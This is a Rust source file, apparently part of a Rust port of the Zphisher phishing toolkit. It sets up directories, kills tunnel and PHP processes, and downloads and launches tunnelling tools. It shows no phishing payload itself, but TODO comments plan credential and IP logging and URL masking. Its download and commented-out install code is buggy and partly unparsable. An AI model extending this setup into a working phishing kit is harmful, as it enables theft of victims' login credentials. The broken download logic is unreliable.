use crate::behind::cli::error_msg;
use crate::behind::constants::*;
use crate::behind::helpers::get_data_dir;
use crate::behind::helpers::get_server_dir;

use colored::Colorize;
use std::env;
use std::env::consts::OS;
use std::fs;
use std::path::{Path, PathBuf};
use std::process::{exit, Command};

use reqwest::Url;
use std::fs::File;
use std::io::Write;

pub(crate) fn setup_directories() {
    let base_dir = match get_data_dir() {
        Some(e) => e.join("zphisher"),
        None => {
            log::error!("{}", "Failed to get home directory".red());
            error_msg("Failed to get home directory");
            exit(1);
        }
    };

    create_dir_if_not_exists(&base_dir.join(".server"));
    create_dir_if_not_exists(&base_dir.join("auth"));
    recreate_dir(&base_dir.join(".server/www"));
    remove_file_if_exists(&base_dir.join(".server/.loclx"));
    remove_file_if_exists(&base_dir.join(".server/.cld.log"));
}

fn handle_error<T, E: std::fmt::Display>(result: Result<T, E>, error_msg_: &str) {
    match result {
        Ok(_) => {}
        Err(e) => {
            log::error!("{}", e);
            error_msg(&format!("{}: {}", error_msg_, e));
            exit(1);
        }
    }
}

fn create_dir_if_not_exists(dir: &Path) {
    if !dir.exists() {
        handle_error(fs::create_dir_all(dir), "Failed to create directory");
    }
}

fn recreate_dir(dir: &Path) {
    if dir.exists() {
        handle_error(fs::remove_dir_all(dir), "Failed to remove directory");
    }
    handle_error(fs::create_dir_all(dir), "Failed to create directory");
}

fn remove_file_if_exists(file: &Path) {
    if file.exists() {
        handle_error(fs::remove_file(file), "Failed to remove file");
    }
}

pub fn banner() {
    const BANNER: &str = r#"
     ______      _     _     _
    |___  /     | |   (_)   | |
       / / _ __ | |__  _ ___| |__   ___ _ __
      / / | '_ \| '_ \| / __| '_ \ / _ \ '__|
     / /__| |_) | | | | \__ \ | | |  __/ |
    /_____| .__/|_| |_|_|___/_| |_|\___|_|
          | |
          |_|
"#;
    println!("{}", BANNER.bright_red());
    println!("HaxRS Version: {}", VERSION.bold());
    println!("Zphisher Version: {}", ZPHISHER_VERSION.bold());
    println!("{} {}", "Created by:".dimmed(), "Skyline".dimmed().bold());
}

pub(crate) fn banner_small() {
    const BANNER: &str = r#"
░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀
"#;
    println!("{}", BANNER.cyan());
    println!("HaxRS Version: {}", VERSION.bold());
    println!("Zphisher Version: {}", ZPHISHER_VERSION.bold());
}

#[cfg(target_os = "windows")]
pub(crate) fn kill_pid() {
    log::info!("Killing processes");
    use sysinfo::{ProcessExt, System, SystemExt};
    let processes_to_kill = vec![
        "php.exe",
        "cloudflared-windows-amd64.exe",
        "loclx.exe",
        "cloudflared-windows-386.exe",
    ];
    let mut sys = System::new_all();

    // We refresh the list of processes.
    sys.refresh_processes();

    for (pid, proc) in sys.processes() {
        if processes_to_kill.contains(&proc.name()) {
            // Kill the process by PID
            if let Err(e) = Command::new("taskkill")
                .arg("/PID")
                .arg(pid.to_string())
                .arg("/F")
                .output()
            {
                log::error!("Failed to kill process {}: {}", pid, e);
                error_msg(&format!("Failed to kill process {}: {}", pid, e));
            }
        }
    }
}

#[cfg(target_os = "linux")]
pub(crate) fn kill_pid() {
    let processes_to_kill = vec!["php", "cloudflared", "loclx"];
    let procs = match procfs::process::all_processes() {
        Ok(p) => p,
        Err(e) => {
            error_msg(&format!("Failed to get processes: {}", e));
            return;
        }
    };

    for proc in procs {
        if let Ok(cmd) = {
            match proc {
                Ok(ref a) => a,
                Err(e) => {
                    log::error!("Failed to get process: {}", e);
                    error_msg(&format!("Failed to get process: {}", e));
                    continue;
                }
            }
        }
        .cmdline()
        {
            if let Some(process_name) = cmd.get(0) {
                if processes_to_kill.contains(&process_name.as_str()) {
                    if let Err(e) = nix::sys::signal::kill(
                        nix::unistd::Pid::from_raw({
                            match proc {
                                Ok(v) => v,
                                Err(e) => {
                                    log::error!("Failed to get process: {}", e);
                                    error_msg(&format!("Failed to get process: {}", e));
                                    continue;
                                }
                            }
                            .pid
                        } as i32),
                        nix::sys::signal::Signal::SIGKILL,
                    ) {
                        log::error!("Failed to kill process: {}", e);
                        error_msg(&format!("Failed to kill process: {}", e));
                    }
                }
            }
        }
    }
}

fn download(url: &str) -> Result<PathBuf, Box<dyn std::error::Error>> {
    let file_name = url.split('/').last().unwrap_or("tmp.bin");
    let file_extension = file_name.split('.').last().unwrap_or("");

    log::info!("Downloading {} to {}", url, file_name);

    let target_path = match get_data_dir() {
        Some(path) => path.join(file_name),
        None => Path::new(file_name).to_path_buf(),
    };

    log::info!("Target path: {:?}", target_path);

    // If the file exists, don't download it again
    if target_path.exists() {
        return Ok(target_path);
    }

    // Download the file
    let response = reqwest::blocking::get(Url::parse(url)?)?;
    let mut file = File::create(&target_path)?;
    file.write_all(response.text()?.as_ref())?;

    log::info!("File extension: {}", file_extension);
    log::info!("File name: {}", file_name);
    log::info!("Target path: {:?}", target_path);

    // Handle different file types
    // TODO: REMEMBER HERE *
    match file_extension {
        "exe" => {}
        "zip" => {
            let mut archive = zip::ZipArchive::new(File::open(file_name)?)?;
            for i in 0..archive.len() {
                let mut file = archive.by_index(i)?;
                let outpath = match file.enclosed_name() {
                    Some(path) => path.to_owned(),
                    None => continue,
                };
                let mut outfile = File::create(&outpath)?;
                std::io::copy(&mut file, &mut outfile)?;
            }
            fs::remove_file(file_name)?;
        }

        "tgz" => {
            let tar_gz = File::open(file_name)?;
            let tar = flate2::read::GzDecoder::new(tar_gz);
            let mut archive = tar::Archive::new(tar);
            archive.unpack(&target_path)?;
        }
        _ => {
            log::error!("Unknown file type: {}", file_extension);
            error_msg(&format!("Unknown file type: {}", file_extension));
            return Err("Unknown file type".into());
        }
    }

    Ok(target_path)
}

pub fn install_dependencies() {
    use rayon::prelude::*;

    let download_links = get_download_urls();

    download_links.par_iter().for_each(|download_link| {
        let exe_path = match env::current_exe() {
            Ok(e) => e,
            Err(e) => {
                log::error!("Failed to get current executable path: {}", e);
                error_msg(&format!("Failed to get current executable path: {}", e));
                return;
            }
        };

        #[cfg(target_os = "windows")]
        let bin_path = windows_server_dir().unwrap_or(
            {
                match exe_path.parent() {
                    Some(p) => p.to_path_buf(),
                    None => {
                        log::error!("Failed to get current executable path");
                        error_msg("Failed to get current executable path");
                        return;
                    }
                }
            }
            .join(BIN_PATH),
        );

        #[cfg(not(target_os = "windows"))]
        let bin_path = match exe_path.parent() {
            Some(p) => p.join(get_server_dir().unwrap_or(BIN_PATH.into())), // Join "bin" directory here.
            None => {
                log::error!("Failed to get current executable path");
                error_msg("Failed to get current executable path");
                return;
            }
        };

        log::info!("{:?}", bin_path);

        if !bin_path.exists() {
            if let Err(e) = fs::create_dir(&bin_path) {
                log::error!("Failed to create 'bin' directory: {}", e);
                error_msg(&format!("Failed to create 'bin' directory: {}", e));
                return;
            }
        }

        match download(download_link) {
            Ok(p) => {
                #[cfg(target_os = "windows")]
                if let Err(e) = Command::new("powershell")
                    .arg("-Command")
                    .arg("Start-Process")
                    .arg(&p)
                    .arg("-ArgumentList")
                    .arg("service")
                    .arg("install")
                    .arg("-Verb")
                    .arg("RunAs")
                    .output()
                {
                    log::error!("Failed to install {}: {e}", p.display());
                    error_msg(&format!("Failed to install {}: {e}", p.display()));
                }
                #[cfg(not(target_os = "windows"))]
                if let Err(e) = Command::new("chmod").arg("+x").arg(&p).output() {
                    log::error!("Failed to give execute permissions to {}: {e}", p.display());
                    error_msg(&format!(
                        "Failed to give execute permissions to {}: {e}",
                        p.display()
                    ));
                }
            }
            Err(e) => {
                log::error!("Failed to download: {}", e);
                error_msg(&format!("Failed to download: {}", e));
            }
        }
    });
}

/*
#[cfg(target_os = "windows")]
pub(crate) async fn install_cloudflared() {
    log::info!("Checking if Cloudflare exists.");

    let exe_path = match env::current_exe() {
        Ok(e) => e,
        Err(e) => {
            log::error!("Failed to get current executable path: {}", e);
            error_msg(&format!("Failed to get current executable path: {}", e));
            return;
        }
    };

    let bin_path = windows_server_dir().unwrap_or({
        match exe_path.parent() {
            Some(p) => p.to_path_buf(),
            None => {
                log::error!("Failed to get current executable path");
                error_msg("Failed to get current executable path");
                return;
            }
        }
    }.join(BIN_PATH));

    log::info!("{:?}", bin_path);


    if !bin_path.exists() {
        if let Err(e) = fs::create_dir(&bin_path) {
            log::error!("Failed to create 'bin' directory: {}", e);
            error_msg(&format!("Failed to create 'bin' directory: {}", e));
            return;
        }
    }


    let filename = match ARCH {
        "x86_64" => "cloudflared-windows-amd64.exe",
        "i686" => "cloudflared-windows-386.exe",
        _ => {
            log::error!("Unsupported architecture");
            error_msg("Unsupported architecture");
            return;
        }
    };

    let cloudflared_path = bin_path.join(filename);
    log::info!("{:?}", cloudflared_path);
    println!("{}", "LOG: Checking if Cloudflare exists... (Downloading if not)".dimmed());

    if !cloudflared_path.exists() {
        match download(CLOUDFLARE_DOWNLOAD_URL) {
            match cloudflared_path.to_str() {
                Some(p) => p,
                None => {
                    log::error!("Failed to get cloudflared path");
                    error_msg("Failed to get cloudflared path");
                    return;
                }
            }
        }).await {
            Ok(_) => (),
            Err(e) => {
            log::error ! ("Failed to download cloudflared: {}", e);
            error_msg( & format ! ("Failed to download cloudflared: {}", e)); return;
            }
        }
    }
    if let Err(e) = Command::new("powershell").arg("-Command").arg("Start-Process").arg(&cloudflared_path).arg("-ArgumentList").arg("service").arg("install").arg("-Verb").arg("RunAs").output() {
        log::error!("Failed to install cloudflared: {}", e);
        error_msg(&format!("Failed to install cloudflared: {}", e));
    }
}*/
/*
#[cfg(not(target_os = "windows"))]
pub(crate) async fn install_cloudflared() {
    use std::fs::File;
    use std::io::Write;

    log::info!("Checking cloudflare...");
    let exe_path = match env::current_exe() {
        Ok(e) => e,
        Err(e) => {
            log::error!("Failed to get current executable path");
            error_msg(&format!("Failed to get current executable path: {}", e));
            return;
        }
    };

    let bin_path = match exe_path.parent() {
        Some(p) => p.join(linux_server_dir().unwrap_or(BIN_PATH.into())), // Join "bin" directory here.
        None => {
            log::error!("Failed to get current executable path");
            error_msg("Failed to get current executable path");
            return;
        }
    };


    // Create "bin" directory if it doesn't exist.
    if !bin_path.exists() {
        if let Err(e) = std::fs::create_dir(&bin_path) {
            log::error!("Failed to create 'bin' directory: {}", e);
            error_msg(&format!("Failed to create 'bin' directory: {}", e));
            return;
        }
    }

    let filename = match ARCH {
        "x86_64" => "cloudflared-linux-amd64",
        "i686" => "cloudflared-linux-386",
        "arm" => "cloudflared-linux-arm",
        "aarch64" => "cloudflared-linux-arm64",
        _ => {
            log::error!("Unsupported architecture");
            error_msg("Unsupported architecture");
            return;
        }
    };

    let cloudflared_path = bin_path.join(filename);

    println!("{}", "LOG: Checking if Cloudflare is already installed...(Downloading if not)".dimmed());
    if !cloudflared_path.exists() {
        match download(format!("{0}/{1}", CLOUDFLARE_DOWNLOAD_URL, filename).as_str(), {
            match cloudflared_path.to_str() {
                Some(p) => p,
                None => {
                    log::error!("Failed to get cloudflared path");
                    error_msg("Failed to get cloudflared path");
                    return;
                }
            }
        }, None).await {
            Ok(_) => (),
            Err(e) => {
                log::error!("Failed to download cloudflared: {}", e);
                error_msg(&format!("Failed to download cloudflared: {}", e));
                return;
            }
        }
    }

    // Give execute permissions to the downloaded file.
    println!("{}", "LOG: Giving execute permissions to Cloudflare...".dimmed());
    if let Err(e) = Command::new("chmod").arg("+x").arg(&cloudflared_path).output() {
        log::error!("Failed to give execute permissions to cloudflared: {}", e);
        error_msg(&format!("Failed to give execute permissions to cloudflared: {}", e));
        return;
    }

    let username = match env::var("USER") {
        Ok(val) => val,
        Err(_) => {
            log::error!("Failed to get username");
            error_msg("Failed to get username");
            return;
        }
    };

    let config_path_str = format!("/home/{}/.haxrs/zphisher/.server/cloudflared/config.yml", username);
    let config_path = Path::new(&config_path_str);

    let config_dir = match config_path.parent() {
        Some(dir) => dir,
        None => {
            log::error!("Failed to get parent directory of config file");
            error_msg("Failed to get parent directory of config file");
            return;
        }
    };

    // Create parent directories if they don't exist.
    if !config_dir.exists() {
        if let Err(e) = std::fs::create_dir_all(&config_dir) {
            log::error!("Failed to create parent directories for config file: {}", e);
            error_msg(&format!("Failed to create parent directories for config file: {}", e));
            return;
        }
    }

    // Now you can create the file.
    let mut file = match File::create(&config_path) {
        Ok(file) => file,
        Err(e) => {
            log::error!("Failed to create config.yml: {}", e);
            error_msg(&format!("Failed to create config.yml: {}", e));
            return;
        }
    };

    // Write default configuration to the file.
    // Replace "default_config" with your actual default configuration.
    let default_config = " ";

    if let Err(e) = file.write_all(default_config.as_bytes()) {
        log::error!("Failed to write to config.yml: {}", e);
        error_msg(&format!("Failed to write to config.yml: {}", e));
        return;
    }
    if let Err(e) = Command::new("sudo").arg(cloudflared_path).arg("--config").arg(&config_path).arg("service").arg("install").output() {
        log::error!("Failed to install cloudflared: {}", e);
        error_msg(&format!("Failed to install cloudflared: {}", e));
    }
} */
/*
#[cfg(target_os = "windows")]
pub(crate) async fn install_localxpose() {
    log::info!("Checking localxpose...");
    println!("{}", "LOG: Checking if LocalXpose is already installed...(Downloading if not)".dimmed());
    let exe_path = match env::current_exe() {
        Ok(e) => e,
        Err(e) => {
            log::error!("Failed to get current executable path");
            error_msg(&format!("Failed to get current executable path: {}", e));
            return;
        }
    };

    let bin_path = match exe_path.parent() {
        Some(p) => p.join(windows_server_dir().unwrap_or(BIN_PATH.into())), // Join "bin" directory here.
        None => {
            log::error!("Failed to get current executable path");
            error_msg("Failed to get current executable path");
            return;
        }
    };

    // Create "bin" directory if it doesn't exist.

    if !bin_path.exists() {
        if let Err(e) = fs::create_dir(&bin_path) {
            log::error!("Failed to create 'bin' directory: {}", e);
            error_msg(&format!("Failed to create 'bin' directory: {}", e));
            return;
        }
    }

    let filename = match ARCH {
        "x86_64" => "loclx-windows-amd64.zip",
        "i686" => "loclx-windows-386.zip",
        _ => {
            log::error!("Unsupported architecture");
            error_msg("Unsupported architecture");
            return;
        }
    };

    // Download LocalXpose if it doesn't exist.
    let localxpose_path = bin_path.join("loclx.exe");
    if !localxpose_path.exists() {
        match download(&format!("{0}/{1}", LOCALXPOSE_DOWNLOAD_URL, filename), {
            match localxpose_path.to_str() {
                Some(p) => p,
                None => {
                    log::error!("Failed to get localxpose path");
                    error_msg("Failed to get localxpose path");
                    return;
                }
            }
        }).await {
            Ok(_) => (),
            Err(e) => {
                log::error!("Failed to download localxpose: {}", e);
                error_msg(&format!("Failed to download localxpose: {}", e));
            }
        }
        let source_path = match exe_path.parent() {
            Some(p) => p.join("loclx.exe"),
            None => {
                log::error!("Failed to get parent directory of the executable");
                error_msg("Failed to get parent directory of the executable");
                return;
            }
        };
        if let Err(e) = fs::rename(source_path, localxpose_path) {
            log::error!("Failed to move localxpose: {}", e);
            error_msg(&format!("Failed to move localxpose: {}", e))
        }
    }
}*/
/*
#[cfg(not(target_os = "windows"))]
pub(crate) async fn install_localxpose() {
    log::info!("Checking localxpose...");
    println!("{}", "LOG: Checking if LocalXpose is already installed...(Downloading if not)".dimmed());
    let exe_path = match env::current_exe() {
        Ok(e) => e,
        Err(e) => {
            log::error!("Failed to get current executable path");
            error_msg(&format!("Failed to get current executable path: {}", e));
            return;
        }
    };

    let bin_path = match exe_path.parent() {
        Some(p) => p.join(linux_server_dir().unwrap_or(BIN_PATH.into())), // Join "bin" directory here.
        None => {
            log::error!("Failed to get current executable path");
            error_msg("Failed to get current executable path");
            return;
        }
    };

    // Create "bin" directory if it doesn't exist.
    if !bin_path.exists() {
        if let Err(e) = fs::create_dir(&bin_path) {
            log::error!("Failed to create 'bin' directory: {}", e);
            error_msg(&format!("Failed to create 'bin' directory: {}", e));
            return;
        }
    }

    let filename = match ARCH {
        "x86_64" => "loclx-linux-amd64.zip",
        "i686" => "loclx-linux-386.zip",
        "aarch64" => "loclx-linux-arm64.zip",
        "armv7l" => "loclx-linux-arm.zip",
        _ => {
            log::error!("Unsupported architecture");
            error_msg("Unsupported architecture");
            return;
        }
    };

    let localxpose_path = bin_path.join("loclx");

    if !localxpose_path.exists() {
        match download(&format!("{0}/{1}", LOCALXPOSE_DOWNLOAD_URL, filename), {
            match localxpose_path.to_str() {
                Some(p) => p,
                None => {
                    log::error!("Failed to get localxpose path");
                    error_msg("Failed to get localxpose path");
                    return;
                }
            }
        }, Some("loclx")).await {
            Ok(_) => (),
            Err(e) => {
                log::error!("Failed to download localxpose: {}", e);
                error_msg(&format!("Failed to download localxpose: {}", e));
                return;
            }
        }

        let source_path = match exe_path.parent() {
            Some(p) => p.join("loclx"),
            None => {
                log::error!("Failed to get parent directory of the executable");
                error_msg("Failed to get parent directory of the executable");
                return;
            }
        };

        if let Err(e) = fs::rename(source_path, &localxpose_path) {
            log::error!("Failed to move localxpose: {}", e);
            error_msg(&format!("Failed to move localxpose: {}", e))
        }
    }
    // Give execute permissions to the downloaded file.
    println!("{}", "LOG: Giving execute permissions to LocalXpose...".dimmed());
    if let Err(e) = Command::new("chmod").arg("+x").arg(&localxpose_path).output() {
        log::error!("Failed to give execute permissions to localxpose: {}", e);
        error_msg(&format!("Failed to give execute permissions to localxpose: {}", e));
    }
}*/

// TODO: Add LocalXpose and Localhost.
// TODO: Add Custom Ports option.
// TODO: Add setting up site mechanism.
// TODO: Add IP logger.
// TODO: Add Credentials logger.
// TODO: Add Data Capture
// TODO: Add Start with Cloudflare.
// TODO: Add LocalXpose Auth.
// TODO: Add Start with LocalXpose.
// TODO: Add Start with Localhost.
// TODO: Add Tunnel Menu.
// TODO: Add URL shortener/masking.
// TODO: Add Menu.

// TODO: Add checks for file download!!!!
